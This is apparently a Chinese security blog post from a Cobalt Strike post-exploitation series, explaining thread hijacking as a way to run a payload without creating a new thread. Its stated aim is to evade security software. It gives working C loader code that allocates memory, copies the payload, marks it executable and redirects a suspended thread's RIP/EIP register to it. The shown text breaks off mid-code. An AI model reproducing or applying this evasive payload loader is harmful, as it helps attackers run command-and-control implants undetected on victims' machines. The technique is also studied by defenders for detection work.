
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
  
  <meta name="generator" content="Hexo 7.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  
  <title>CS-高级执行方式 - SafeKiller Zone</title>

  
    <meta name="description" content="总字符数: 68.84K                代码: 57.72K, 文本: 5.79K               预计阅读时间: 4.60 小时            线程劫持 线程劫持是一种无需创建新线程就可以执行负载的技术。 它通过挂起线程并修改其寄存器，使寄存器指向内存中存储的有效载荷的起始地址。当线程恢复执行时，就会从这个新地址开始执行，从而运行有效载荷。  线程上">
<meta property="og:type" content="article">
<meta property="og:title" content="CS-高级执行方式">
<meta property="og:url" content="https://jiangjiyue.github.io/2024/11/15/d30120c3/index.html">
<meta property="og:site_name" content="SafeKiller Zone">
<meta property="og:description" content="总字符数: 68.84K                代码: 57.72K, 文本: 5.79K               预计阅读时间: 4.60 小时            线程劫持 线程劫持是一种无需创建新线程就可以执行负载的技术。 它通过挂起线程并修改其寄存器，使寄存器指向内存中存储的有效载荷的起始地址。当线程恢复执行时，就会从这个新地址开始执行，从而运行有效载荷。  线程上">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/1731027476488.jpg">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108134148179.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108132911338.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108133412932.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108134104482.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241024180446165.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241115132713548.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085747559.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085837498.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085952570.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090018215.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090112432.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090412454.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090517766.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090642141.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104118275.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104316538.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104507021.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104632272.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025110328965.png">
<meta property="article:published_time" content="2024-11-15T05:34:49.000Z">
<meta property="article:modified_time" content="2024-11-15T05:34:48.681Z">
<meta property="article:author" content="Kill3r">
<meta property="article:tag" content="Cobalt Strike">
<meta property="article:tag" content="后渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/1731027476488.jpg">
  
  
  
  <meta name="keywords" content="Cobalt Strike,后渗透">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.27.0">

  
    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
  

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
</div>
<div class="widgets">
<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Cobalt Strike</span></div><div class="widget-body"><a class="item" href="/2024/09/24/3c3f9499/"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="/2024/09/25/3c3f9499/"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/26/da146604/"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/10/28/ce454855/"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item" href="/2024/11/07/c9983715/"><span class="title">CS-反沙箱杂谈</span></a><a class="item active" href="/2024/11/15/d30120c3/"><span class="title">CS-高级执行方式</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>

<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/15/d30120c3/"><span class="title">CS-高级执行方式</span></a><a class="item title" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item title" href="/2024/07/11/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item title" href="/2024/07/10/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item title" href="/2024/07/08/b7b8d727/"><span class="title">应急响应之Windows</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/09/24/3c3f9499/">Cobalt Strike</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-11-15T05:34:49.000Z">2024-11-15</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-11-15T05:34:48.681Z">2024-11-15</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>CS-高级执行方式</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
    <p>总字符数: 68.84K </p>
    </div>
    <div class="cell" style="">
    <p>代码: 57.72K, 文本: 5.79K</p>
    </div>
    <div class="cell" style="">
    <p>预计阅读时间: 4.60 小时</p>
    </div>
    </div>

<h2 id="线程劫持"><a href="#线程劫持" class="headerlink" title="线程劫持"></a>线程劫持</h2><blockquote>
<p>线程劫持是一种无需创建新线程就可以执行负载的技术。</p>
<p>它通过挂起线程并修改其寄存器，使寄存器指向内存中存储的有效载荷的起始地址。当线程恢复执行时，就会从这个新地址开始执行，从而运行有效载荷。</p>
</blockquote>
<h3 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h3>
    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">
    <iframe src="https://player.bilibili.com/player.html?bvid=BV1Cfx7e2Eqr&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">
    </iframe>
    </div>
    

<p>我们需要先了解“线程上下文”这一概念。每个线程都有一个调度优先级，并且系统会保存一组结构到线程上下文中。线程上下文包含了线程恢复执行所需的所有信息，包括线程的CPU寄存器和堆栈集合。</p>
<p>Windows 提供了两个 API 函数来处理线程上下文：</p>
<ol>
<li><code>GetThreadContext</code>：用于检索线程的上下文信息。</li>
<li><code>SetThreadContext</code>：用于设置线程的上下文信息。</li>
</ol>
<p><code>GetThreadContext</code>函数会返回一个包含线程所有信息的<code>CONTEXT</code>结构体。而 <code>SetThreadContext</code> 函数则会将一个填充好的<code>CONTEXT</code>结构体设置到指定的线程上。</p>
<blockquote>
<p>为什么选择劫持现有的线程而不是创建一个新的线程来执行有效载荷呢?</p>
<ol>
<li>创建新线程：<ul>
<li>如果通过创建一个新线程来执行有效载荷，那么这个新线程的入口点必须指向有效载荷在内存中的基地址。这样做会暴露有效载荷的基地址，从而让安全软件更容易检测到有效载荷的内容。</li>
</ul>
</li>
<li>劫持现有线程：<ul>
<li>相比之下，劫持现有线程时，线程的入口点仍然指向一个正常的流程函数。即使安全软件监控线程的活动，也不会轻易发现异常，因为线程看起来仍然是良性的。通过这种方式，有效载荷可以在不引起怀疑的情况下被执行。</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="再探Create-Thread"><a href="#再探Create-Thread" class="headerlink" title="再探Create Thread"></a>再探Create Thread</h3><blockquote>
<p><code>CreateThread</code>函数的第三个参数<code>LPTHREAD_START_ROUTINE lpStartAddress</code>指定了线程的入口地址。如果使用线程创建，<code>lpStartAddress</code>会直接指向有效载荷的地址。另一方面，线程劫持会将入口地址指向一个正常的功能。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]            SIZE_T                  dwStackSize,</span></span><br><span class="line"><span class="params">  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,</span></span><br><span class="line"><span class="params">  [in, optional]  __drv_aliasesMem LPVOID lpParameter,</span></span><br><span class="line"><span class="params">  [in]            DWORD                   dwCreationFlags,</span></span><br><span class="line"><span class="params">  [out, optional] LPDWORD                 lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>创建线程：使用<code>CreateThread</code>函数创建一个新线程，并设置一个正常函数作为线程的入口点。保存创建的线程句柄，以便后续操作。</li>
<li>暂停线程：使用<code>SuspendThread</code> 函数将新创建的线程暂停，使其处于停止状态。</li>
<li>获取线程上下文：使用<code>GetThreadContext</code>函数获取线程的上下文信息，特别是<code>RIP</code>(64位)或 <code>EIP</code>(32位)寄存器的值。</li>
<li>修改线程上下文：修改<code>RIP</code>或<code>EIP</code>寄存器的值，使其指向有效载荷的起始地址。使用<code>SetThreadContext</code>函数将修改后的上下文信息设置回线程。</li>
<li>恢复线程：使用<code>ResumeThread</code>函数恢复线程的执行，此时线程将从修改后的入口点开始执行，即执行有效载荷。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个简单的测试函数，作为线程的初始入口点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;      <span class="comment">// 定义一个整数 a 并初始化为 1</span></span><br><span class="line">    <span class="type">int</span> b = a + <span class="number">10</span>; <span class="comment">// 定义一个整数 b，并将 a 加 10 的结果赋值给 b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程劫持函数，用于在目标线程中注入并执行有效载荷</span></span><br><span class="line">BOOL <span class="title function_">RunViaClassicThreadHijacking</span><span class="params">(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize)</span> &#123;</span><br><span class="line">    PVOID pAddress = <span class="literal">NULL</span>;         <span class="comment">// 用于存储分配的内存地址</span></span><br><span class="line">    DWORD dwOldProtection = <span class="number">0</span>;     <span class="comment">// 用于保存修改前的内存保护属性</span></span><br><span class="line">    CONTEXT ThreadCtx;             <span class="comment">// 定义线程上下文结构体</span></span><br><span class="line">    ThreadCtx.ContextFlags = CONTEXT_FULL; <span class="comment">// 设置上下文标志为 CONTEXT_FULL，以获取完整的线程上下文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为有效载荷分配内存</span></span><br><span class="line">    pAddress = VirtualAlloc(<span class="literal">NULL</span>, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAlloc 失败，错误码: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 如果分配失败，打印错误信息并返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将有效载荷复制到分配的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pAddress, pPayload, sPayloadSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改内存保护以允许执行</span></span><br><span class="line">    <span class="keyword">if</span> (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualProtect 失败，错误码: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 如果修改内存保护失败，打印错误信息并返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取原始线程上下文</span></span><br><span class="line">    <span class="keyword">if</span> (!GetThreadContext(hThread, &amp;ThreadCtx)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] GetThreadContext 失败，错误码: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 如果获取线程上下文失败，打印错误信息并返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新指令指针以跳转到有效载荷</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ThreadCtx.Rip = (DWORD64)pAddress; <span class="comment">// 在64位系统上，将RIP寄存器设置为有效载荷的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    ThreadCtx.Eip = (DWORD)pAddress;   <span class="comment">// 在32位系统上，将EIP寄存器设置为有效载荷的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置新的线程上下文</span></span><br><span class="line">    <span class="keyword">if</span> (!SetThreadContext(hThread, &amp;ThreadCtx)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] SetThreadContext 失败，错误码: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 如果设置线程上下文失败，打印错误信息并返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">// 成功返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个线程，初始入口为良性函数 Test，线程在创建时处于暂停状态</span></span><br><span class="line">    HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Test, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建线程失败。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 如果线程创建失败，打印错误信息并返回 1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 